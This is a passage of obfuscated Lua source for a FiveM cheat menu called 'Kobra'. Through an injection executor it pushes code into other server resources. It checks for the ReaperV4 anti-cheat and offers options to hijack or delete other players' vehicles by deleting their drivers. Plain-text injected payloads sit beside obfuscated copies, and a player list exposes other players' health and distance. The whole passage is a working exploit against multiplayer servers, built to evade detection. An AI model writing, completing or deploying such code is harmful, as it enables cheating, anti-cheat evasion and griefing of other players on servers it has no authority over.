do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1572   .. [[)
                                        ]] );end v1711=1 -0 ;end if (v1711==2) then Wait(3 -2 );SetPedIntoVehicle(v1384,v1570, -1);Wait(1337 -887 );ClearPedTasksImmediately(v1384);v1711=3;end if (v1711==(3 + 0)) then SetEntityCoordsNoOffset(v1384,v1385.x,v1385.y,v1385.z,true,true,true,true);Wait(35 + 65 );break;end if ((1 + 0)==v1711) then Wait(18 + 22 );SetPedIntoVehicle(v1384,v1570, -(1 + 0));Wait(1 + 0 );SetPedIntoVehicle(v1384,v1570,GetEmptySeat(v1570));v1711=2 + 0 ;end end end break;end if ((0 -0)==v1571) then if ( not v1570 or  not DoesEntityExist(v1570)) then return;end v1572=GetPedInVehicleSeat(v1570, -1);v1571=1 + 0 ;end end end CreateThread(function() if v1393 then if ((v1395~=0) and IsEntityAVehicle(v1395)) then local v1668=v1395;v1396(v1668);end end end);break;end if (v1381==(582 -(134 + 445))) then hNative("NetworkHasControlOfEntity",function(v1573,...) return v1573(...);end);v1382=nil;function v1382(v1574,v1575) local v1576=0;local v1577;while true do if (v1576==(0 -0)) then v1575=v1575 or (1851 + 149) ;v1577=GetGameTimer();v1576=1 + 0 ;end if (v1576==(3 -2)) then while (GetGameTimer() -v1577)<v1575  do if NetworkHasControlOfEntity(v1574) then return true;end NetworkRequestControlOfEntity(v1574);Wait(0);end return NetworkHasControlOfEntity(v1574);end end end v1383=nil;function v1383(v1578) local v1579=math.rad(v1578.z);local v1580=math.rad(v1578.x);local v1581=math.abs(math.cos(v1580));return vector3( -math.sin(v1579) * v1581 ,math.cos(v1579) * v1581 ,math.sin(v1580));end function GetEmptySeat(v1582) local v1583={ -(261 -(36 + 224)),0,1351 -(1126 + 224) ,2};for v1610,v1611 in ipairs(v1583) do if IsVehicleSeatFree(v1582,v1611) then return v1611;end end return  -(1 + 0);end v1381=4;end if (v1381==(13 -9)) then v1384=PlayerPedId();v1385=GetEntityCoords(v1384);v1386=GetCamCoord(_G.KobraFreecamObject);v1387=GetCamRot(_G.KobraFreecamObject,2);v1388=v1383(v1387);v1389=1064 -(48 + 16) ;v1381=4 + 1 ;end if (v1381==(9 -7)) then hNative("ClearPedTasksImmediately",function(v1584,...) return v1584(...);end);hNative("SetEntityCoordsNoOffset",function(v1585,...) return v1585(...);end);hNative("IsEntityAVehicle",function(v1586,...) return v1586(...);end);hNative("SetPedIntoVehicle",function(v1587,...) return v1587(...);end);hNative("PlayerPedId",function(v1588,...) return v1588(...);end);hNative("NetworkRequestControlOfEntity",function(v1589,...) return v1589(...);end);v1381=3;end end end elseif (v836=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1397=0 -0 ;local v1398;while true do if (v1397==0) then v1398=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1398,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1487,v1488) local v1489=_G[v1487];if ( not v1489 or (type(v1489)~="function")) then return;end _G[v1487]=function(...) return v1488(v1489,...);end;end hNative("CreateThread",function(v1490,...) return v1490(...);end);hNative("Wait",function(v1491,...) return v1491(...);end);hNative("DoesEntityExist",function(v1492,...) return v1492(...);end);hNative("GetEntityCoords",function(v1493,...) return v1493(...);end);hNative("GetCamCoord",function(v1494,...) return v1494(...);end);hNative("GetCamRot",function(v1495,...) return v1495(...);end);hNative("StartShapeTestRay",function(v1496,...) return v1496(...);end);hNative("GetShapeTestResult",function(v1497,...) return v1497(...);end);hNative("GetPedInVehicleSeat",function(v1498,...) return v1498(...);end);hNative("SetEntityVisible",function(v1499,...) return v1499(...);end);hNative("DeletePed",function(v1500,...) return v1500(...);end);hNative("ClearPedTasksImmediately",function(v1501,...) return v1501(...);end);hNative("SetEntityCoordsNoOffset",function(v1502,...) return v1502(...);end);hNative("IsEntityAVehicle",function(v1503,...) return v1503(...);end);hNative("SetPedIntoVehicle",function(v1504,...) return v1504(...);end);hNative("PlayerPedId",function(v1505,...) return v1505(...);end);hNative("NetworkRequestControlOfEntity",function(v1506,...) return v1506(...);end);hNative("NetworkHasControlOfEntity",function(v1507,...) return v1507(...);end);local function v1468(v1508,v1509) local v1510=0 + 0 ;local v1511;while true do if (v1510==(1089 -(910 + 179))) then v1509=v1509 or (3962 -1962) ;v1511=GetGameTimer();v1510=1 -0 ;end if (v1510==(1380 -(933 + 446))) then while (GetGameTimer() -v1511)<v1509  do local v1662=0;while true do if (v1662==1) then Wait(0 + 0 );break;end if ((1524 -(248 + 1276))==v1662) then if NetworkHasControlOfEntity(v1508) then return true;end NetworkRequestControlOfEntity(v1508);v1662=1 + 0 ;end end end return NetworkHasControlOfEntity(v1508);end end end local function v1469(v1512) local v1513=0 + 0 ;local v1514;local v1515;local v1516;while true do if (v1513==1) then v1516=math.abs(math.cos(v1515));return vector3( -math.sin(v1514) * v1516 ,math.cos(v1514) * v1516 ,math.sin(v1515));end if (v1513==0) then v1514=math.rad(v1512.z);v1515=math.rad(v1512.x);v1513=3 -2 ;end end end function GetEmptySeat(v1517) local v1518=0;local v1519;while true do if (v1518==(3 -2)) then return  -(1546 -(151 + 1394));end if ((944 -(929 + 15))==v1518) then v1519={ -(1 -0),0,1,1 + 1 };for v1663,v1664 in ipairs(v1519) do if IsVehicleSeatFree(v1517,v1664) then return v1664;end end v1518=1307 -(1125 + 181) ;end end end local v1470=PlayerPedId();local v1471=GetEntityCoords(v1470);local v1472=GetCamCoord(_G.KobraFreecamObject);local v1473=GetCamRot(_G.KobraFreecamObject,2);local v1474=v1469(v1473);local v1475=2917 -1917 ;local v1476=v1472 + (v1474 * v1475) ;local v1477=StartShapeTestRay(v1472.x,v1472.y,v1472.z,v1476.x,v1476.y,v1476.z, -1,v1470,0 + 0 );local v1478,v1479,v1480,v1478,v1481=GetShapeTestResult(v1477);local function v1482(v1520) local v1521=0;local v1522;while true do if (v1521==(0 -0)) then if ( not v1520 or  not DoesEntityExist(v1520)) then return;end v1522=GetPedInVehicleSeat(v1520, -(1190 -(626 + 563)));v1521=1;end if (v1521==1) then if ((v1522~=0) and DoesEntityExist(v1522)) then local v1669=1250 -(153 + 1097) ;while true do if (v1669==2) then Wait(3 -2 );SetPedIntoVehicle(v1470,v1520, -(1 + 0));Wait(450);ClearPedTasksImmediately(v1470);v1669=3;end if ((2 -1)==v1669) then Wait(22 + 18 );SetPedIntoVehicle(v1470,v1520, -1);Wait(1);SetPedIntoVehicle(v1470,v1520,GetEmptySeat(v1520));v1669=2 + 0 ;end if (v1669==(0 + 0)) then SetPedIntoVehicle(v1470,v1520,0 + 0 );v1468(v1520,1748 + 252 );Wait(10);for v1740=1157 -(199 + 958) ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1522   .. [[)
                                        ]] );end v1669=1;end if (v1669==3) then Wait(161 + 89 );SetPedIntoVehicle(v1470,v1520, -(2 -1));break;end end end break;end end end CreateThread(function() if v1479 then if ((v1481~=0) and IsEntityAVehicle(v1481)) then local v1665=0;local v1666;while true do if (v1665==(0 -0)) then v1666=v1481;v1482(v1666);break;end end end end end);end elseif (v836=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1483=1176 -(1169 + 7) ;local v1484;while true do if (v1483==(1873 -(751 + 1122))) then v1484=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1484,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1590=0;local v1591;local v1592;local v1593;local v1594;local v1595;local v1596;local v1597;local v1598;local v1599;local v1600;local v1601;local v1602;local v1603;local v1604;local v1605;while true do if (v1590==(0 + 0)) then function hNative(v1670,v1671) local v1672=0;local v1673;while true do if ((1 + 0)==v1672) then _G[v1670]=function(...) return v1671(v1673,...);end;break;end if (v1672==0) then v1673=_G[v1670];if ( not v1673 or (type(v1673)~="function")) then return;end v1672=1;end end end hNative("CreateThread",function(v1674,...) return v1674(...);end);hNative("Wait",function(v1675,...) return v1675(...);end);hNative("DoesEntityExist",function(v1676,...) return v1676(...);end);hNative("GetEntityCoords",function(v1677,...) return v1677(...);end);hNative("GetCamCoord",function(v1678,...) return v1678(...);end);v1590=1;end if (v1590==1) then hNative("GetCamRot",function(v1679,...) return v1679(...);end);hNative("StartShapeTestRay",function(v1680,...) return v1680(...);end);hNative("GetShapeTestResult",function(v1681,...) return v1681(...);end);hNative("GetPedInVehicleSeat",function(v1682,...) return v1682(...);end);hNative("SetEntityVisible",function(v1683,...) return v1683(...);end);hNative("DeletePed",function(v1684,...) return v1684(...);end);v1590=1 + 1 ;end if (v1590==2) then hNative("ClearPedTasksImmediately",function(v1685,...) return v1685(...);end);hNative("SetEntityCoordsNoOffset",function(v1686,...) return v1686(...);end);hNative("IsEntityAVehicle",function(v1687,...) return v1687(...);end);hNative("SetPedIntoVehicle",function(v1688,...) return v1688(...);end);hNative("PlayerPedId",function(v1689,...) return v1689(...);end);hNative("NetworkRequestControlOfEntity",function(v1690,...) return v1690(...);end);v1590=1 + 2 ;end if (v1590==(4 -1)) then hNative("NetworkHasControlOfEntity",function(v1691,...) return v1691(...);end);v1591=nil;function v1591(v1692,v1693) local v1694=1181 -(589 + 592) ;local v1695;while true do if (1==v1694) then while (GetGameTimer() -v1695)<v1693  do local v1741=0 -0 ;while true do if (0==v1741) then if NetworkHasControlOfEntity(v1692) then return true;end NetworkRequestControlOfEntity(v1692);v1741=1 + 0 ;end if (v1741==(25 -(13 + 11))) then Wait(0 + 0 );break;end end end return NetworkHasControlOfEntity(v1692);end if (v1694==(0 + 0)) then v1693=v1693 or (3260 -(684 + 576)) ;v1695=GetGameTimer();v1694=1;end end end v1592=nil;function v1592(v1696) local v1697=0 + 0 ;local v1698;local v1699;local v1700;while true do if (v1697==(0 -0)) then v1698=math.rad(v1696.z);v1699=math.rad(v1696.x);v1697=1;end if (v1697==(1 + 0)) then v1700=math.abs(math.cos(v1699));return vector3( -math.sin(v1698) * v1700 ,math.cos(v1698) * v1700 ,math.sin(v1699));end end end function GetEmptySeat(v1701) local v1702={ -(1 -0),0 + 0 ,1 + 0 ,1850 -(230 + 1618) };for v1712,v1713 in ipairs(v1702) do if IsVehicleSeatFree(v1701,v1713) then return v1713;end end return  -(1 + 0);end v1590=2 + 2 ;end if ((5 + 0)==v1590) then v1599=v1595 + (v1597 * v1598) ;v1600=StartShapeTestRay(v1595.x,v1595.y,v1595.z,v1599.x,v1599.y,v1599.z, -(204 -(131 + 72)),v1593,0);v1601,v1602,v1603,v1601,v1604=GetShapeTestResult(v1600);v1605=nil;function v1605(v1703) if ( not v1703 or  not DoesEntityExist(v1703)) then return;end local v1704=GetPedInVehicleSeat(v1703, -1);if ((v1704~=(0 + 0)) and DoesEntityExist(v1704)) then SetPedIntoVehicle(v1593,v1703,204 -(144 + 60) );v1591(v1703,2000);Wait(40 -30 );for v1739=0 -0 ,2 + 2  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1704   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1593,v1703, -(4 -3));Wait(1 + 0 );SetPedIntoVehicle(v1593,v1703,GetEmptySeat(v1703));Wait(1923 -(523 + 1399) );SetPedIntoVehicle(v1593,v1703, -(1 + 0));Wait(854 -(72 + 332) );ClearPedTasksImmediately(v1593);SetEntityCoordsNoOffset(v1593,v1594.x,v1594.y,v1594.z,true,true,true,true);Wait(100);MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1703   .. [[)
                                    ]] );else local v1723=976 -(269 + 707) ;while true do if (v1723==2) then SetEntityCoordsNoOffset(v1593,v1594.x,v1594.y,v1594.z,true,true,true,true);break;end if (v1723==(1 -0)) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1703   .. [[)
                                    ]] );Wait(250 -150 );v1723=132 -(123 + 7) ;end if (v1723==(0 + 0)) then SetPedIntoVehicle(v1593,v1703, -(1 + 0));Wait(455 -355 );v1723=2 -1 ;end end end end CreateThread(function() if v1602 then if ((v1604~=0) and IsEntityAVehicle(v1604)) then local v1742=0;local v1743;while true do if (v1742==(1088 -(38 + 1050))) then v1743=v1604;v1605(v1743);break;end end end end end);break;end if (v1590==(2 + 2)) then v1593=PlayerPedId();v1594=GetEntityCoords(v1593);v1595=GetCamCoord(_G.KobraFreecamObject);v1596=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1597=v1592(v1596);v1598=1000;v1590=3 + 2 ;end end end end end end local v505=v17[v15];if v505 then if ((v505.type=="slider") or (v505.type=="slider-checkbox")) then local v837=823 -(426 + 397) ;local v838;local v839;while true do if (v837==(1407 -(751 + 655))) then if (v838<=(20 -10)) then if (IsControlPressed(0 + 0 ,1419 -(39 + 1206) ) and ((v839-v300)>v301)) then v12:ScrollTwo("Left");v300=v839;elseif (IsControlPressed(0 -0 ,175) and ((v839-v300)>v301)) then local v1427=0;while true do if (0==v1427) then v12:ScrollTwo("Right");v300=v839;break;end end end elseif IsControlPressed(841 -(566 + 275) ,1109 -(167 + 768) ) then v12:ScrollTwo("Left");elseif IsControlPressed(0,67 + 108 ) then v12:ScrollTwo("Right");end break;end if (v837==0) then v838=v505.max or 100 ;v839=GetGameTimer();v837=1 -0 ;end end end end end end);local v101=0 + 0 ;local v102=115 + 5 ;local v103=0;local v104=120;local v105=0 -0 ;local v106=120;MachoOnKeyDown(function(v302) local v303=tonumber(v302) or v302 ;local v304=v44[v303] or "Unknown" ;local v305=GetGameTimer();if (v304==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v304=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v304=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v304=="Q") and ((v305-v105)>v106)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v304=="E") and ((v305-v105)>v106)) then if (v13 and v24) then v12:NextCategory();end elseif ((v304=="ArrowUp") and ((v305-v101)>v102)) then if v13 then v12:ScrollOne("Up");v101=v305;end elseif ((v304=="ArrowDown") and ((v305-v101)>v102)) then if v13 then v12:ScrollOne("Down");v101=v305;end elseif (v304=="ArrowLeft") then local v1523=15 -(8 + 7) ;local v1524;while true do if (v1523==(1683 -(1510 + 173))) then v1524=v17[v15];if v1524 then if ((v1524.type=="slider") or ((v1524.type=="slider-checkbox") and ((v305-v103)>v104))) then local v1724=0 -0 ;local v1725;local v1726;while true do if (v1724==1) then if (v1725<=(1 + 9)) then local v1761=253 -(30 + 223) ;while true do if (v1761==(1256 -(300 + 956))) then v12:ScrollTwo("Left");v103=v1726;break;end end else v12:ScrollTwo("Left");end break;end if (v1724==(122 -(22 + 100))) then v1725=v1524.max or (220 -120) ;v1726=GetGameTimer();v1724=1;end end elseif ((v1524.type=="scrollable") or (v1524.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v304=="ArrowRight") then local v1612=v17[v15];if v1612 then if ((v1612.type=="slider") or ((v1612.type=="slider-checkbox") and ((v305-v103)>v104))) then local v1714=282 -(47 + 235) ;local v1715;local v1716;while true do if (v1714==(3 -2)) then if (v1715<=(6 + 4)) then local v1753=486 -(21 + 465) ;while true do if (v1753==(0 + 0)) then v12:ScrollTwo("Right");v103=v1716;break;end end else v12:ScrollTwo("Right");end break;end if (v1714==(0 + 0)) then v1715=v1612.max or 100 ;v1716=GetGameTimer();v1714=1 + 0 ;end end elseif ((v1612.type=="scrollable") or (v1612.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end elseif (v304=="F5") then local v1667=v17[v15];if (v13 and v24 and v1667 and ((v1667.type=="button") or (v1667.type=="checkbox") or (v1667.type=="slider-checkbox"))) then local v1717=0 -0 ;while true do if (v1717==(1218 -(553 + 664))) then v59(("Bind %s"):format(v1667.label),"",function(v1748) for v1754,v1755 in pairs(v44) do if (v1755:lower()==v1748:lower()) then local v1763=0 + 0 ;local v1764;while true do if (v1763==(79 -(73 + 5))) then if v1764 then local v1776=1715 -(1128 + 587) ;while true do if ((0 -0)==v1776) then v25[ #v25 + (691 -(558 + 132)) ]={key=v1764,keyRaw=v1754,keyLabel=v44[v1754],type=v1667.type,label=v1667.label,checked=v1667.checked or false ,value=v1667.value or (2 -1) ,step=v1667.step or (0.25 -0) ,min=v1667.min or (0.25 + 0) ,max=v1667.max or (4 + 1) ,onSelect=v1667.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(220 + 280 );v1763=2 + 0 ;end if ((2 -0)==v1763) then v12:ShowUI();return;end if (v1763==(0 + 0)) then v1764=v45[v1754];for v1774,v1775 in pairs(v25) do if (v1775.keyRaw==v1754) then v12:Notify("error","Kobra","There is already a keybind with that key!",1542 + 1458 );return;end end v1763=772 -(294 + 477) ;end end end end end,"keybind");break;end if ((0 + 0)==v1717) then v12:HideUI();Wait(566 -316 );v1717=1;end end end elseif v24 then for v1727,v1728 in pairs(v25) do if (v1728.type=="button") then local v1744=0;local v1745;while true do if (v1744==(0 -0)) then v1745=v1728.keyRaw;if v1745 then if (v1745==v303) then local v1772=0 + 0 ;while true do if (v1772==0) then v1728.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1728.label),2458 + 542 );break;end end end end break;end end elseif (v1728.type=="checkbox") then local v1756=0;local v1757;while true do if (v1756==0) then v1757=v1728.keyRaw;if (v1757 and (v1757==v303)) then v1728.checked= not v1728.checked;v12:UpdateTabChecked(v16,v1728.label,v1728.checked);if v1728.onSelect then v1728.onSelect(v1728.checked);end v12:ShowKeybindList(v25);v12:Notify((v1728.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1728.checked and "enabled") or "disabled" ,v1728.label),3000);if v13 then v12:UpdateElements(v17);end end break;end end elseif (v1728.type=="slider-checkbox") then local v1765=v1728.keyRaw;if (v1765 and (v1765==v303)) then local v1767=0 -0 ;while true do if ((984 -(97 + 885))==v1767) then v12:Notify((v1728.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1728.checked and "enabled") or "disabled" ,v1728.label),1408 + 1592 );if v13 then v12:UpdateElements(v17);end break;end if (v1767==(0 -0)) then v1728.checked= not v1728.checked;v12:UpdateTabChecked(v16,v1728.label,v1728.checked);v1767=366 -(271 + 94) ;end if (v1767==(1604 -(777 + 826))) then if v1728.onSelect then v1728.onSelect(v1728.value,v1728.checked);end v12:ShowKeybindList(v25);v1767=1 + 1 ;end end end end end end end);v12.InListMenu=function(v306) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v307) local v308=0;local v309;while true do if (v308==2) then v307:UpdateElements(v17);break;end if (v308==(1356 -(117 + 1238))) then if (v309.label~="List") then return;end for v740,v741 in ipairs(v309.tabs) do if (v741.type=="checkbox") then v741.checked=true;if (v741.serverId and tonumber(v741.serverId)) then v27[tonumber(v741.serverId)]=true;end end end v308=2;end if ((1715 -(686 + 1029))==v308) then if ( not v18 or  not v18[v19]) then return;end v309=v18[v19];v308=1357 -(1074 + 282) ;end end end;v12.UnselectEveryone=function(v310) local v311=0;local v312;while true do if ((1618 -(1359 + 258))==v311) then if (v312.label~="List") then return;end for v742,v743 in ipairs(v312.tabs) do if (v743.type=="checkbox") then local v903=0 -0 ;while true do if ((1935 -(1730 + 205))==v903) then v743.checked=false;if (v743.serverId and tonumber(v743.serverId)) then v27[tonumber(v743.serverId)]=false;end break;end end end end v311=530 -(67 + 461) ;end if (v311==0) then if ( not v18 or  not v18[v19]) then return;end v312=v18[v19];v311=1 -0 ;end if (v311==(2 -0)) then v310:UpdateElements(v17);break;end end end;v12.ClearSelection=function(v313) local v314=0;while true do if (v314==0) then v27={};if (v18 and v18[v19]) then local v840=0;local v841;while true do if (v840==0) then v841=v18[v19];if ((v841.label=="List") and v841.tabs) then for v1261,v1262 in ipairs(v841.tabs) do if (v1262.type=="checkbox") then v1262.checked=false;end end end break;end end end v314=2 -1 ;end if (v314==1) then v12:UnselectEveryone();break;end end end;v12.UpdateListMenu=function(v315) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v316=v18[v19];if (v316.label~="List") then return;end local v317=GetEntityCoords(PlayerPedId());if  not v317 then return;end local v318=v315:GetNearbyPlayers(v317,350,true);local v319;for v506,v507 in ipairs(v316.tabs) do if ((v507.type=="divider") and (v507.label=="Nearby Players")) then v319=v506;break;end end if  not v319 then return;end for v508= #v316.tabs,v319 + 1 + 0 , -(630 -(129 + 500)) do table.remove(v316.tabs,v508);end if ( #v318==(1711 -(1157 + 554))) then v316.tabs[ #v316.tabs + (1 -0) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v318,function(v661,v662) return tonumber(v661.serverId)<tonumber(v662.serverId) ;end);for v663,v664 in ipairs(v318) do local v665=tonumber(v664.serverId);if (v665 and v664.name) then local v842,v843=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v665)));v316.tabs[ #v316.tabs + (608 -(82 + 525)) ]={type="checkbox",label=("%s - [%s]"):format(v664.name,v665),serverId=v665,checked=v27[v665] or false ,name=v664.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665)))~=(0 -0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665))) , -1)==GetPlayerPed(GetPlayerFromServerId(v665))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v665)))))   .. ".0m" },{key="Server ID",value=v665},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v665))),color="0, 255, 